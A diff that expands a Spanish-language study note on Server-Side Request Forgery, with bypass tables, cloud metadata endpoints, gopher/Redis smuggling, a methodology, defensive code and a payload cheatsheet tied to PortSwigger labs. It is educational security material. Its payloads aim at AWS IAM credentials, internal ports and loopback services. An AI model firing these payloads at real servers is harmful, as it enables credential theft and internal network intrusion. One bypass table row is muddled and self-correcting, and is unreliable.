@@ -1,21 +1,211 @@
 ---
-aliases: SSRF
+aliases:
+  - SSRF
+  - Server-Side Request Forgery
 tags:
-  - hacking/explotacion
-  - hacking/laboratorios
-  - redes/conceptos
-  - herramientas/burpsuite
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/ssrf
+  - sec/redes
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[HTTP Host header attacks]]"
+  - "[[Envenenamiento de Caché Web]]"
+  - "[[Vulnerabilidad de Redirección Abierta]]"
+  - "[[Remote File Inclusion RFI]]"
+  - "[[Abuso de APIs]]"
+  - "[[XML External Entity Injection]]"
+fuente: "https://portswigger.net/web-security/ssrf"
 ---
-El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.
+# Server-Side Request Forgery (SSRF)
 
-En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.
+El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad en la que un atacante **fuerza al servidor a realizar peticiones de red en su nombre**, controlando la URL o parte de ella. Como la petición nace *dentro* de la red del servidor (loopback, red interna, servicios cloud), el atacante obtiene un **proxy de red privilegiado**: alcanza hosts inalcanzables desde Internet, lee el metadata de la nube, habla con servicios que confían en el origen local y, en el mejor de los casos, encadena a RCE.
 
-El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.
+> [!info] SSRF vs CSRF
+> En el **CSRF** el navegador del usuario víctima envía la petición (el atacante solo la diseña). En el **SSRF** el **servidor** la envía: el atacante no necesita engañar a ningún usuario ni que haya sesión — basta una entrada de URL que el backend consuma. También difiere de [[Remote File Inclusion RFI|RFI]]: RFI busca *ejecutar* un archivo remoto; SSRF busca *que el servidor haga la petición* (aunque ambas comparten el requisito de controlar una URL).
 
-Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.
+## Mecánica: anatomía de una URL y cómo la parsea cada capa
 
-Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.
+Una URL no es un string — es una estructura con gramática propia (RFC 3986) que los distintos componentes parsean **con reglas distintas**. Todo bypass de SSRF nace de una divergencia de parseo:
+
+```
+scheme://userinfo@host:puerto/ruta?query=fragmento
+│    │      │      │   │
+│    │      │      │   └─ puerto: 1-65535; omitido = default del esquema
+│    │      │      └────── host: dominio o IP (IPv4, IPv6 entre [ ], decimal, hex…)
+│    │      └───────────── userinfo: "usuario:clave@" — el navegador toma todo lo anterior al ÚLTIMO @ como host real
+│    └──────────────────── esquema: http, https, gopher, dict, file, ftp, ftps…
+└───────────────────────── jerarquía obligatoria tras el esquema
+```
+
+| Componente | Ejemplo | Vector de bypass |
+|---|---|---|
+| **scheme** | `http://` | Si el filtro solo bloquea `http`, probar `https`, `gopher`, `dict`, `file` |
+| **userinfo** | `http://whitelisted.com@127.0.0.1/` | El host real es lo que va **tras el último `@`**; el filtro ve el dominio blanco |
+| **host** | `127.0.0.1` | Representaciones alternativas: decimal `2130706433`, hex `0x7f000001`, octal `0177.0.0.1`, IPv6 `[::1]`, IPv4-mapped `[::ffff:127.0.0.1]`, `0.0.0.0`, `127.1`, `localhost`, DNS propio `spoofed.burpcollaborator.net` → 127.0.0.1 |
+| **puerto** | `:8080` | Fuzzing de puertos internos vía el parámetro |
+| **ruta/query** | `/admin?x=` | Path traversal en servicios (Elasticsearch `/_cat`, actuator `/env`) |
+| **fragmento** | `#` | Corta la lectura del filtro en parseadores que no lo descartan |
+
+> [!warning] La regla de oro del SSRF
+> El filtro y el cliente HTTP (curl, `requests`, la librería del lenguaje) pueden **discrepar** sobre cuál es el host. `requests` de Python, por ejemplo, parsea el userinfo y el host según WHATWG URL, mientras un regex del defensor busca `localhost` en el string crudo. Cada bypass de esta nota es una instancia de esa discrepancia.
+
+## Catálogo de bypass de filtros
+
+| Filtro | Bypass |
+|---|---|
+| Blacklist `localhost` | `127.0.0.1`, `2130706433` (decimal), `0x7f000001`, `017700000001` (octal), `[::1]`, `[::ffff:7f00:1]`, `0`, `0.0.0.0`, `127.1`, `localtest.me` (A→127.0.0.1), `spoofed.burpcollaborator.net` (DNS propio) |
+| Blacklist `admin` | Doble URL-encoding `%2561dmin` (si hay doble decodificación), `%61dmin` |
+| Whitelist solo `internal.com` | `http://internal.com@evil.com`… no: al revés — `http://evil.com@internal.com` no sirve; el truco es `http://internal.com%23@evil.com`… el bueno: `http://internal.com@127.0.0.1` → host `127.0.0.1`, filtro ve `internal.com`; o **open redirect** en un dominio permitido: `http://internal.com/redirect?url=http://169.254.169.254/` seguido por el backend |
+| Bloqueo de `http://` directo | Open redirect legítimo (ver [[Vulnerabilidad de Redirección Abierta]]) + follow de redirecciones |
+| DNS estático del filtro | **DNS rebinding**: el hostname resuelve primero a IP pública (pasa el filtro) y en la segunda consulta (conexión) a IP interna — herramientas: `rbndr.us`, DNS propio con TTL 0 |
+| Blacklist por extensión/dominio | Encadenar con un servicio que haga SSRF propio (webhook, preview de URL, pdf generator) |
+| Solo se permite un esquema | Cambiar a `gopher://`, `dict://`, `file://` si el backend los soporta (urllib de Python históricamente sí) |
+
+### IPv6, decimales y formas cortas — referencia rápida
+
+```text
+127.0.0.1      →  2130706433            (decimal: 127·256³ + 0·256² + 0·256 + 1)
+               →  0x7F000001            (hex)
+               →  0177.0.0.1            (octal por cuarteto)
+               →  127.1                  (forma corta: último octeto = host completo)
+               →  [::1]                 (IPv6 loopback)
+               →  [::ffff:127.0.0.1]    (IPv4-mapped)
+               →  [0:0:0:0:0:ffff:7f00:1]
+169.254.169.254 →  2852039166            (decimal del metadata AWS/Azure)
+```
+
+## Cloud metadata: la cadena favorita
+
+Los proveedores cloud exponen un servidor de metadata **en la propia VM**, accesible solo desde dentro. Si el SSRF puede alcanzar esa IP, obtiene credenciales de la instancia.
+
+| Proveedor | Endpoint | Requisitos |
+|---|---|---|
+| **AWS** | `http://169.254.169.254/latest/meta-data/` | IMDSv1: nada. IMDSv2: primero un token |
+| **GCP** | `http://metadata.google.internal/computeMetadata/v1/` o `169.254.169.254` | Header obligatorio: `Metadata-Flavor: Google` |
+| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Header: `Metadata: true` |
+| **DigitalOcean** | `http://169.254.169.254/metadata/v1/` | Ninguno |
+| **Alibaba** | `http://10.0.0.1/latest/meta-data/` (o `100.100.100.200`) | Ninguno |
+| **OpenStack** | `http://169.254.169.254/openstack/latest/meta_data.json` | Ninguno |
+
+### IMDSv2 (AWS, defensa moderna)
+
+```bash
+# 1. Pedir token (con límite de TTL)
+curl -X PUT "http://169.254.169.254/latest/api/token" \
+     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# → TOKEN
+# 2. Usarlo en cada consulta
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+```
+
+Un SSRF simple que solo controla la URL **no** puede hacer el PUT+header → IMDSv2 rompe la cadena. Pero un SSRF que además permite **controlar métodos y headers** (API GraphQL, proxy con custom headers) sí puede. Ruta de exfiltración típica:
+
+```text
+SSRF → metadata → rol IAM (ej. s3:*) → credenciales temporales → acceso S3/otros servicios → account takeover / RCE en servicios managed
+```
+
+## Protocol smuggling: gopher, dict, file
+
+Cuando el backend usa una librería genérica de URLs (Python `urllib`/`requests` antiguos, PHP con `allow_url_fopen`, Java `URL`), el esquema **no** se limita a HTTP:
+
+| Esquema | Capacidad | Uso en ataque |
+|---|---|---|
+| `gopher://host:port/_PAYLOAD` | Escribe **bytes arbitrarios** (con `%0d%0a` = CRLF) sobre cualquier TCP | Hablar Redis (SET webshell), Memcached (poison de sesiones), SMTP, MySQL — **gopher es el "curl multinivel" del SSRF** |
+| `dict://host:port/` | Protocolo DICT: comandos simples | Probar puertos, lectura de servicios |
+| `file:///etc/passwd` | Lectura de archivos locales | Equivale a LFI — ver [[Local File Inclusion]] |
+| `ftp://`, `tftp://` | Transferencias antiguas | Subida/lectura en configsFTP antiguas |
+
+> [!warning] Modernidad
+> `requests` (Python ≥2.x moderno) y las librerías actuales de Go/Java **no** soportan gopher/file por defecto; el protocol smuggling vive en stacks legacy, librerías mal configuradas y en puertos de servicio internos que hablan texto (Redis sin auth, Elasticsearch). Probar siempre los esquemas alternativos cuando el filtro solo mira `http`.
+
+## SSRF ciego: oráculos
+
+Muchos SSRF no devuelven la respuesta ("URL verificada, sin output"). El atacante trabaja por **oráculos indirectos**:
+
+| Oráculo | Cómo se explota |
+|---|---|
+| **DNS OOB** | Hostname único por payload (`<random>.burpcollaborator.net`): la resolución confirma ejecución aunque no haya respuesta |
+| **HTTP OOB** | El backend hace fetch a tu servidor (colaborador/webhook) con headers identificativos |
+| **Time-based** | Conectar a puertos filtrados tarda (TCP timeout ~21s) vs puertos abiertos (rápido) → mapeo de puertos interno |
+| **Diferencia de respuesta** | Longitud/estado/cuerpo distinto según exista el host/ruta |
+| **Errores diferenciados** | "connection refused" vs "timeout" vs "HTTP 404" en el mensaje de error |
+| **DNS rebinding oráculo** | Para el timing entre dos resoluciones |
+
+Blind SSRF típico → impacto: en PortSwigger, un `Referer` que el backend resuelve permite (a) confirmar OOB, (b) descubrir la IP interna del servidor vulnerable con Intruder, y (c) detonar [[Shellshock Vulnerabilidad en Bash|Shellshock]] en un CGI interno — RCE encadenada.
+
+## Metodología completa
+
+1. **Descubrir el punto**: parámetros tipo `url`, `uri`, `path`, `dest`, `endpoint`, `callback`, `webhook`, `img`, `feed`, `load`, `fetch`, `site`, `domain`, `host`, `ip`, `ping`, `report`, `preview` en GET/POST/JSON/headers (`Referer`, `X-Forwarded-Host`) — el Referer fue el vulnerable en los labs de PortSwigger: probar **todas** las entradas.
+2. **Clasificar**: ¿refleja el contenido (full)? ¿solo status? ¿solo "OK/not OK" (blind)? ¿interacción OOB?
+3. **Confirmar control**: `http://TU-COLLABORATOR.net` → interacción; luego `http://127.0.0.1` → diferencia de respuesta.
+4. **Mapa interno**: fuzzing de puertos (`wfuzz -z range,1-65535`) y hosts (`192.168.0.0/24`) vía el SSRF; identificar servicios y versiones.
+5. **Bypass de filtros**: recorrer el catálogo (representaciones de IP, userinfo, doble encoding, open redirect, DNS rebinding).
+6. **Pivote de alto valor**: `http://localhost/admin`, metadata cloud, APIs internas (Elastic, actuator, Kubernetes `10.96.0.1:443`, Redis vía gopher).
+7. **Escalada**: metadata → credenciales cloud; gopher → Redis/Memcached → RCE; [[Shellshock Vulnerabilidad en Bash|Shellshock]] en CGI interno.
+8. **Blind → semi-blind**: convertir OOB en puerto/acceso con colaborador + timing.
+
+## Defensa (con código)
+
+### 1. Allowlist + parseo — nunca string matching
+
+```python
+# VULNERABLE: filtro de string
+if "localhost" in url or url.startswith("http://127."):
+    bloquear(url)
+fetch(url)   # 2130706433, [::1], 0x7f000001… lo pasan
+
+# SEGURO: parsear y comparar contra allowlist de hosts + IP pública resuelta
+from urllib.parse import urlparse
+import ipaddress, socket
+
+def es_url_segura(url: str, allow: set[str]) -> bool:
+    p = urlparse(url)
+    if p.scheme not in ("http", "https"):        # sin gopher/dict/file
+        return False
+    if p.username or p.password:                   # sin userinfo confuso
+        return False
+    host = p.hostname
+    if host not in allow:                          # igualdad exacta, no contains
+        return False
+    try:
+        ips = [ipaddress.ip_address(socket.gethostbyname(host))]
+    except OSError:
+        return False
+    return all(not (i.is_private or i.is_loopback or i.is_link_local
+                    or i.is_reserved or i.is_multicast) for i in ips)
+```
+
+### 2. Egress filtering (la defensa que escala)
+
+- Firewall de salida: los servidores web **solo** hacia Internet por proxy saliente autenticado; bloquear rangos RFC1918, `169.254.0.0/16`, `100.64.0.0/10`, loopback.
+- Cloud: *IMDSv2 obligatorio* (`HttpPutResponseHopLimit=1`), y políticas IAM de mínimo privilegio por instancia.
+- DNS interno: no resolver nombres externos desde el segmento de servidores.
+
+### 3. Código que no sigue redirecciones ni acepta métodos arbitrarios
+
+```java
+// Java: deshabilitar follow-redirects y limitar esquemas
+HttpClient client = HttpClient.newBuilder()
+    .followRedirects(HttpClient.Redirect.NEVER)   // rompe open-redirect chains
+    .build();
+```
+
+```ini
+; PHP: apagar la capacidad de red de los wrappers
+allow_url_fopen = Off       ; bloquea http:// en include/file_get_contents
+```
+
+### 4. Arquitectura
+
+- Separar la funcionalidad "fetch de URLs" en un servicio aislado (red restringida, sin metadata, sin acceso a la red interna).
+- Validar dominio **antes** de la petición y en cada redirect seguido.
+
+> [!tip] Laboratorio propio
+> En las notas de práctica de esta nota se construye desde cero un entorno Docker con red interna (`docker network create --driver=bridge network1 --subnet=10.10.0.0/24`) para practicar el pivote producción→preproducción.
 
 En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.
 
@@ -440,3 +630,58 @@ Perfecto, ya podemos eliminar el usuario `carlos`:
 ![[Pasted image 20250917225103.png]]
 
 Lab Terminado.
+
+## Errores comunes
+
+**Del atacante:**
+1. Probar solo `localhost`/`127.0.0.1` y rendirse con un filtro: siempre recorrer el catálogo de representaciones (decimal, hex, IPv6, DNS propio).
+2. Ignorar headers como `Referer` o `X-Forwarded-Host` como vectores: el lab blind de PortSwigger era exactamente eso.
+3. No mirar el follow-redirect: un `302` del backend hacia metadata es el bypass más limpio de whitelist.
+4. En cloud, detenerse en la lectura de metadata sin explotar el rol IAM: la cadena real continúa con las credenciales temporales.
+5. Olvidar gopher/dict/file al ver un backend "moderno": verificar con un esquema benigno si el parser los acepta.
+6. Confundir SSRF con XSPA (cross-site port scan): el primero exfiltra contenido, el segundo solo mapea puertos por timing.
+
+**Del defensor:**
+1. Filtrar por string (`blacklist localhost`) en vez de parsear la URL y comparar la IP resuelta.
+2. Validar solo la URL inicial y seguir redirects ciegamente: cada redirect debe re-validarse.
+3. No bloquear egress en firewall: la validación en código falla alguna vez; la red es la red de defensa.
+4. Dejar IMDSv1 activo (v1 no exige token) en instancias cloud.
+5. Exponer el metadata service y la red interna en la misma segmentación que los servidores web.
+
+## Cheatsheet
+
+| Paso | Payload / acción |
+|---|---|
+| Confirmar OOB | `http://TU-COLLABORATOR.net/t` |
+| Loopback | `http://127.0.0.1:PUERTO`, `http://localhost/admin` |
+| Decimal | `http://2130706433/` (127.0.0.1), `http://2852039166/` (metadata) |
+| Hex / octal | `http://0x7f000001/`, `http://0177.0.0.1/` |
+| IPv6 | `http://[::1]/`, `http://[::ffff:127.0.0.1]/` |
+| Userinfo | `http://whitelisted.com@127.0.0.1/` |
+| DNS propio | `http://spoofed.COLLAB.net/` → A record a 127.0.0.1 |
+| Open redirect chain | `http://permitido.com/redirect?url=http://169.254.169.254/` |
+| AWS metadata | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` |
+| Azure | `http://169.254.169.254/metadata/instance` + `Metadata: true` |
+| Redis vía gopher | `gopher://127.0.0.1:6379/_SET%20clave%20valor` |
+| Fuzzing puertos | `wfuzz -z range,1-65535 'http://app/utility.php?url=http://127.0.0.1:FUZZ'` |
+| Defensa | Parseo + allowlist + IP pública resuelta + egress filtering + IMDSv2 |
+
+## Laboratorios y referencias
+
+- **PortSwigger Academy — SSRF**: https://portswigger.net/web-security/ssrf (los 7 labs resueltos en esta nota)
+- **HackTricks — SSRF**: https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery.html
+- **PayloadsAllTheThings — SSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+- **AWS IMDSv2**: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
+- Notas internas: [[Vulnerabilidad de Redirección Abierta]], [[HTTP Host header attacks]], [[Remote File Inclusion RFI]], [[XML External Entity Injection]]
+
+## Relacionadas
+
+- [[HTTP Host header attacks]] — manipulación de routing/URLs por cabeceras, primo del SSRF
+- [[Envenenamiento de Caché Web]] — encadenado SSRF→cache poisoning en CDNs
+- [[Vulnerabilidad de Redirección Abierta]] — el bypass de whitelist por follow-redirect
+- [[Remote File Inclusion RFI]] — la otra cara del control de URL en el servidor
+- [[Abuso de APIs]] — SSRF contra APIs internas y cloud
+- [[XML External Entity Injection]] — XXE como vector de SSRF interno
+- [[Shellshock Vulnerabilidad en Bash]] — RCE encadenada desde un SSRF ciego
+- [[Local File Inclusion]] — cuando el esquema atacado es `file://`
